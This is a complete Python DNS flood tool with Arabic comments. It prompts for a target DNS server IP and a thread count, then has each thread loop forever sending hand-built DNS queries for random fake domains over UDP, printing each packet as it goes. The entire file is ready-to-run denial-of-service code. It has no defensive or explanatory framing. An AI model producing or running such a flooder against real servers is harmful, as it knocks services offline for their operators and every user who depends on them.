import socket
import random
import threading
from colorama import Fore as F

# دالة لإنشاء اسم نطاق مزيف عشوائي
def generate_random_domain():
    return ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=8)) + ".com"

# هجوم DNS
def dns_flood(target_ip, target_port=53):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)  # استخدام UDP لأن DNS يعتمد عليه
    while True:
        # إنشاء طلب DNS عشوائي
        domain = generate_random_domain()
        request = (
            b"\xAA\xAA"  # ID
            b"\x01\x00"  # Flags
            b"\x00\x01"  # Number of questions
            b"\x00\x00"  # Number of answers
            b"\x00\x00"  # Number of authority records
            b"\x00\x00"  # Number of additional records
        )
        # إضافة اسم النطاق العشوائي إلى الطلب
        for part in domain.split("."):
            request += bytes([len(part)]) + part.encode("utf-8")
        request += b"\x00"  # Terminating the domain
        request += b"\x00\x01"  # Query type: A
        request += b"\x00\x01"  # Query class: IN

        # إرسال الطلب إلى خادم DNS المستهدف
        sock.sendto(request, (target_ip, target_port))
        print(f"{F.CYAN}request Sent!{F.RESET} | domain fake: {F.GREEN}{request}{F.RESET}")

# تشغيل الهجوم عبر عدة threads
def start_dns_flooding(target_ip, thread_count):
    for _ in range(thread_count):
        thread = threading.Thread(target=dns_flood, args=(target_ip,))
        thread.start()

if __name__ == "__main__":
    target_ip = input(f"{F.CYAN}[?]{F.RESET} target IP DNS: {F.GREEN}")
    num_threads = int(input(f"{F.CYAN}[?]{F.RESET} threads: {F.GREEN}"))
    start_dns_flooding(target_ip, num_threads)

